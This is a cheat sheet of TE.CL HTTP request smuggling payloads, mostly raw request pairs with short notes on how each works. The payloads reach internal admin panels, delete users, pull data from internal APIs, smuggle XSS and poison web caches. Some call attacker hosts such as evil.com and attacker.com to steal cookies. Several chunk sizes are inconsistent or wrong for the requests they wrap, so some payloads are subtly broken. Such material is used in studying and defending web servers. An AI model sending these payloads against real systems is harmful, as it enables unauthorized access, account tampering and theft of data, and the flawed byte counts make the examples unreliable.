### TE.CL (Transfer-Encoding & Content-Length) HTTP Request Smuggling

TE.CL (Transfer-Encoding & Content-Length) is an HTTP request smuggling technique that exploits differences in header interpretation between frontend and backend servers. The frontend honors `Transfer-Encoding: chunked`, while the backend relies on `Content-Length`, allowing attackers to append extra requests that are processed by the backend but not seen by the frontend.

* **Two-Step Process:** First request smuggles, second request activates
* **Header Conflict:** Frontend processes chunked encoding, backend uses content length
* **Chunked Encoding:** Requests are divided into chunks with hexadecimal sizes
* **Exploitation:** Smuggle requests by crafting chunks that confuse server parsing
* **Termination:** Must end with `0\r\n\r\n` for proper chunked format
* **Impact:** Unauthorized access, data exfiltration, privilege escalation

-----

### Basic TE.CL Payloads and Impact

Understanding the fundamental TE.CL attack vectors and their potential impact.

#### Understanding Two-Request TE.CL Process

1. Smuggling Request

```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 4
Transfer-Encoding: chunked

5\r\n
hello\r\n
0\r\n
\r\n
```

2. Activation Request

```http
GET /anything HTTP/1.1
Host: vulnerable.com
```

* **Why it's used:** To test if the frontend processes `Transfer-Encoding` while backend uses `Content-Length`. This basic payload helps identify if the server configuration is vulnerable to TE.CL attacks.
* **How it works:** 
  * Frontend server sees `Transfer-Encoding: chunked` and processes the body as chunks
  * Backend server ignores `Transfer-Encoding` and uses `Content-Length: 4`
  * The frontend reads the entire chunked body, while backend only reads 4 bytes after headers
  * When the second request arrives, the leftover data gets processed

#### Simple Request Smuggling with Activation

1. Smuggling Request

```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 4
Transfer-Encoding: chunked

2a\r\n
GET /admin HTTP/1.1
Host: localhost\r\n
\r\n
0\r\n
\r\n
```

2. Activation Request

```http
GET /home HTTP/1.1
Host: vulnerable.com
```

* **Why it's used:** For basic request smuggling to access admin endpoints or internal resources that shouldn't be publicly accessible.
* **How it works:**
  * Frontend processes the chunked encoding: reads `2a` (42 bytes in hex), then the smuggled GET request
  * Backend uses `Content-Length: 4` and only reads `2a\r\n` (4 bytes)
  * The smuggled GET request remains in the backend's buffer
  * When activation request arrives, backend processes `GET /admin` as a complete request

#### Smuggling POST Requests with Activation

1. Smuggling Request

```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 4
Transfer-Encoding: chunked

47\r\n
POST /admin/delete HTTP/1.1
Host: localhost
Content-Length: 10\r\n
\r\n
username=admin
0\r\n
\r\n
```

2. Activation Request

```http
GET /public HTTP/1.1
Host: vulnerable.com
```

* **Why it's used:** When you need to smuggle POST requests with body parameters to perform actions like user deletion, privilege modification, or data manipulation.
* **How it works:**
  * The chunk size `47` (71 bytes in hex) covers the entire smuggled POST request
  * Frontend processes the chunk and sees the termination with `0\r\n\r\n`
  * Backend only reads 4 bytes due to `Content-Length: 4`, leaving the POST request in buffer
  * Activation request triggers the backend to process the smuggled POST request

-----

### Advanced TE.CL Techniques

Sophisticated techniques for complex exploitation scenarios.

#### Bypassing Security Controls with Duplicate Headers

1. Smuggling Request

```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 4
Transfer-Encoding: chunked

3d\r\n
GET /admin HTTP/1.1
X-Forwarded-Host: localhost\r\n
Content-Type: application/x-www-form-urlencoded\r\n
\r\n
0\r\n
\r\n
```

2. Activation Request

```http
POST /api/data HTTP/1.1
Host: vulnerable.com
Content-Type: application/json
Content-Length: 20

{"test":"value"}
```

* **Why it's used:** When the backend server blocks duplicate `Host` headers or has security controls that detect obvious smuggling attempts.
* **How it works:**
  * Uses `X-Forwarded-Host` instead of `Host` header to bypass duplicate header detection
  * Adds `Content-Type` header to make the request appear more legitimate
  * The chunk size `3d` (61 bytes in hex) accurately reflects the smuggled request length
  * Activation request triggers the smuggled admin access

#### Using Different Content Types for Evasion

1. Smuggling Request

```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 4
Transfer-Encoding: chunked

45\r\n
GET /admin HTTP/1.1
Host: localhost
Content-Type: application/json\r\n
\r\n
0\r\n
\r\n
```

2. Activation Request

```http
GET /api/status HTTP/1.1
Host: vulnerable.com
```

* **Why it's used:** When the target application expects specific content types or when JSON endpoints need to be accessed through smuggling.
* **How it works:**
  * Sets `Content-Type: application/json` to match API expectations
  * Makes the smuggled request appear as a legitimate API call
  * Can bypass content-type validation on the backend
  * Activation request triggers the JSON-based admin interface access

-----

### Complex Smuggling Scenarios

Advanced scenarios for sophisticated attacks.

#### Chaining Multiple Requests with Single Activation

1. Smuggling Multiple Requests

```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 4
Transfer-Encoding: chunked

2a\r\n
GET /admin HTTP/1.1
Host: localhost\r\n
\r\n
2a\r\n
POST /log HTTP/1.1
Host: localhost\r\n
\r\n
0\r\n
\r\n
```

2. Activation Request

```http
GET /index HTTP/1.1
Host: vulnerable.com
```

* **Why it's used:** When you need to execute multiple smuggled requests in sequence, such as accessing an admin panel and then logging the action.
* **How it works:**
  * First chunk contains a GET request to `/admin` (42 bytes = `2a` in hex)
  * Second chunk contains a POST request to `/log` (42 bytes = `2a` in hex)
  * Both requests remain in backend buffer after frontend processing
  * Single activation request triggers both smuggled requests sequentially

#### Smuggling with XSS Payloads

1. Smuggling XSS Request

```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 4
Transfer-Encoding: chunked

50\r\n
GET /search?q=<script>alert(1)</script> HTTP/1.1
Host: localhost\r\n
\r\n
0\r\n
\r\n
```

2. Activation Request

```http
GET /search?q=test HTTP/1.1
Host: vulnerable.com
```

* **Why it's used:** To deliver XSS payloads through smuggled requests, potentially affecting other users or administrators.
* **How it works:**
  * Smuggles a GET request with an XSS payload in the query parameter
  * When activation request triggers processing, this request might be logged or reflected
  * Can lead to stored XSS if the search term is displayed to other users
  * Combines request smuggling with client-side attacks for maximum impact

-----

### Real-World Exploitation Examples

Practical examples of TE.CL exploitation in different contexts.

#### Admin Panel Access with Activation

1. Smuggling Request

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

35\r\n
GET /administrator HTTP/1.1
Host: 127.0.0.1\r\n
\r\n
0\r\n
\r\n
```

2. Activation Request

```http
GET /login HTTP/1.1
Host: target.com
```

* **Impact:** Gain access to internal admin interfaces that are not exposed to the public internet.
* **How it works:**
  * Smuggles a request to `/administrator` endpoint
  * Uses `127.0.0.1` as host to access internal resources
  * Allows bypassing IP-based restrictions on admin panels
  * Activation request triggers the admin panel access

#### User Account Manipulation with Activation

1. Smuggling Request

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

55\r\n
POST /users/delete HTTP/1.1
Host: localhost
Content-Length: 15\r\n
\r\n
userId=12345
0\r\n
\r\n
```

2. Activation Request

```http
GET /profile HTTP/1.1
Host: target.com
```

* **Impact:** Delete user accounts or modify user privileges without authorization.
* **How it works:**
  * Smuggles a POST request to delete a specific user
  * Includes proper `Content-Length` for the smuggled request's body
  * Activation request triggers the user deletion
  * The backend processes this as a legitimate user deletion request

#### Data Exfiltration with Activation

1. Smuggling Request

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

60\r\n
GET /api/users/sensitive-data HTTP/1.1
Host: internal-api\r\n
\r\n
0\r\n
\r\n
```

2. Activation Request

```http
POST /api/normal HTTP/1.1
Host: target.com
Content-Type: application/json
Content-Length: 25

{"action":"standard"}
```

* **Impact:** Extract sensitive information from internal APIs that are not directly accessible.
* **How it works:**
  * Smuggles a request to internal API endpoints
  * Accesses `sensitive-data` that might contain PII or business secrets
  * Uses `internal-api` host to target internal network services
  * Activation request triggers data exfiltration attempt

-----

### Real-World Exploitation Scenarios

Practical examples of TE.CL exploitation in different contexts.

#### Bypassing IP-Based Restrictions with Activation

1. Smuggling Request

```http
POST /api/users HTTP/1.1
Host: public-api.com
Content-Length: 4
Transfer-Encoding: chunked

3e\r\n
GET /internal/admin HTTP/1.1
Host: 127.0.0.1
X-Real-IP: 10.1.1.1\r\n
\r\n
0\r\n
\r\n
```

2. Activation Request

```http
GET /api/status HTTP/1.1
Host: public-api.com
```

* **Scenario:** An API has IP-based restrictions that block external access to admin endpoints.
* **Impact:** Access internal admin functionality from external networks.

#### Web Cache Poisoning with Activation

1. Smuggling Request

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

4a\r\n
GET /poisoned HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com\r\n
\r\n
0\r\n
\r\n
```

2. Activation Request

```http
GET /resources/script.js HTTP/1.1
Host: target.com
```

* **Scenario:** The application uses caching and reflects headers in responses.
* **Impact:** Poison web cache to serve malicious content to other users.

#### Credential Theft via Redirect with Activation

1. Smuggling Request

```http
POST /login HTTP/1.1
Host: app.com
Content-Length: 4
Transfer-Encoding: chunked

55\r\n
GET /redirect?url=https://attacker.com/steal?cookie= HTTP/1.1
Host: localhost\r\n
\r\n
0\r\n
\r\n
```

2. Activation Request

```http
POST /login HTTP/1.1
Host: app.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

username=user&password=pass123
```

* **Scenario:** The application has an open redirect vulnerability.
* **Impact:** Steal session cookies or authentication tokens via smuggled redirects.

-----

**Made with love by VIsh0k**